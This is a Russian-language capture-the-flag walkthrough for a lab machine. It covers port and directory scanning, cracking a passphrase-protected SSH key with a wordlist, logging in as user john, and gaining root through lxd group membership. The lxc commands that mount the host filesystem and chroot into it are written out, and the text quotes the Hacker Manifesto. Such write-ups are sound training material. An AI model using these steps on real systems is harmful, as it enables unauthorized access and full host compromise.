Открыты два порта, сразу переходим к веб-серверу
```
# Nmap 7.95 scan initiated Sat May 16 17:01:03 2026 as: nmap -sS -p- --stats-every=5s -oA result 10.114.160.192
Nmap scan report for 10.114.160.192
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sat May 16 17:01:12 2026 -- 1 IP address (1 host up) scanned in 9.75 seconds
```

На веб-сервере нас встречает красивый сайт. Изучаем сайт.

![](../images/Pasted%20image%2020260516211501.png)

На сервере существует файл robots.txt. В нем мы можем найти директорию /uploads/

![](../images/Pasted%20image%2020260516211738.png)

В этой директории несколько файлов. Разберем их подробнее.

![](../images/Pasted%20image%2020260516211832.png)

Файл dict.lst - это файл со словарем, скорее всего пароли. Позже я подумал, что это пароли к картинке meme.jpg. А в manifesto.txt лежит текстовое обращение. Интересное и красивое, но информации из него никакой получить невозможно.

```
 The Hacker Manifesto

			          by
			    +++The Mentor+++
			Written January 8, 1986

Another one got caught today, it's all over the papers. "Teenager Arrested in Computer Crime 
Scandal", "Hacker Arrested after Bank Tampering"...

Damn kids. They're all alike.

But did you, in your three-piece psychology and 1950's technobrain, ever take a look behind 
the eyes of the hacker? Did you ever wonder what made him tick, what forces shaped him, 
what may have molded him?

I am a hacker, enter my world...

Mine is a world that begins with school... I'm smarter than most of the other kids, this crap 
they teach us bores me...

Damn underachiever. They're all alike.

I'm in junior high or high school. I've listened to teachers explain for the fifteenth time 
how to reduce a fraction. I understand it. "No, Ms. Smith, I didn't show my work. I did it 
in my head..."

Damn kid. Probably copied it. They're all alike.

I made a discovery today. I found a computer. Wait a second, this is cool. It does what I 
want it to. If it makes a mistake, it's because I screwed it up. Not because it doesn't like 
me... Or feels threatened by me.. Or thinks I'm a smart ass.. Or doesn't like teaching and 
shouldn't be here...

Damn kid. All he does is play games. They're all alike.

And then it happened... a door opened to a world... rushing through the phone line like heroin
through an addict's veins, an electronic pulse is sent out, a refuge from the day-to-day 
incompetencies is sought... a board is found. "This is it... this is where I belong..." I know
everyone here... even if I've never met them, never talked to them, may never hear from them 
again... I know you all...

Damn kid. Tying up the phone line again. They're all alike...

You bet your ass we're all alike... we've been spoon-fed baby food at school when we hungered 
for steak... the bits of meat that you did let slip through were pre-chewed and tasteless. 
We've been dominated by sadists, or ignored by the apathetic. The few that had something to 
teach found us willing pupils, but those few are like drops of water in the desert.

This is our world now... the world of the electron and the switch, the beauty of the baud. We 
make use of a service already existing without paying for what could be dirt-cheap if it 
wasn't run by profiteering gluttons, and you call us criminals. We explore... and you call us 
criminals. We seek after knowledge... and you call us criminals. We exist without skin color, 
without nationality, without religious bias... and you call us criminals. You build atomic 
bombs, you wage wars, you murder, cheat, and lie to us and try to make us believe it's for 
our own good, yet we're the criminals.

Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by 
what they say and think, not what they look like. My crime is that of outsmarting you, 
something that you will never forgive me for.

I am a hacker, and this is my manifesto. You may stop this individual, but you can't stop us 
all... after all, we're all alike.
```

Теперь проверим пароли к картинке, возможно какой-то из паролей подойдёт.

Ничего не подошло.

В это время ffuf закончил свою работу и нашел две директории. uploads, про которую мы уже знаем и secret.

```
└─$ ffuf -u 'http://10.114.160.192/FUZZ' -w namelist.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.114.160.192/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

secret                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 146ms]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 142ms]
:: Progress: [151265/151265] :: Job [1/1] :: 201 req/sec :: Duration: [0:10:13] :: Errors: 0 ::
```

В директории secret лежит RSA ключ

![](../images/Pasted%20image%2020260516215710.png)

Теперь я думаю, что список ключей необходим для расшифровки RSA ключа. Пробуем запустить перебрать через john.

И действительно, находим пароль.

![](../images/Pasted%20image%2020260516221033.png)

Теперь мы можем расшифровать ключ.

Изучив исходный код сайта, мы можем найти комментарий

![](../images/Pasted%20image%2020260516223517.png)

Думаю можно попробовать подключиться к ssh по приватному ключу и нику john.

Действительно, получилось зайти. Читаем флаг пользователя.

![](../images/Pasted%20image%2020260516223619.png)

Проверим версию ядра

```
john@exploitable:/home$ uname -a
Linux exploitable 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
john@exploitable:/home$ cat /proc/version
Linux version 4.15.0-76-generic (buildd@lcy01-amd64-029) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020
john@exploitable:/home$ cat /etc/issue
Ubuntu 18.04.4 LTS \n \l
```

Судя по всему система уязвима к CVE-2021-3493. Но у нас нету gcc, make и пароля от sudo. Очень много векторов атаки не работают.

Я посмотрел на группы пользователя john и нашел там много разных групп
```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Самое лучшее из этого кажется lxd. Я нашел [статью](https://github.com/initstring/lxd_root/blob/master/README.md) в интернете, как эскалировать привилегии до рута с помощью группы lxd. Для этого нам надо создать привилегированный контейнер и смонтировать корень файловой системы внутрь контейнера.

Так как машина не подключена к интернету мне пришлось скачивать образ и файловую систему самому и перекидывать через scp.

![](../images/Pasted%20image%2020260516235334.png)

Далее на удаленном сервере создаем контейнер

![](../images/Pasted%20image%2020260516235432.png)

После этого добавляем устройство в контейнер и монтируем корень настоящей файловой системы в контейнер в путь /mnt/root. 
```
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```

Далее выполняем команду, которая открывает рут оболочку в директории /mnt/root, где у нас смонтирована настоящая система
```
lxc exec privesc -- chroot /mnt/root /bin/bash
```

Так как контейнер работает от лица рута, мы получаем рут поверх настоящей файловой системы, тем самым повышаем привилегии и читаем флаг

![](../images/Pasted%20image%2020260516235945.png)
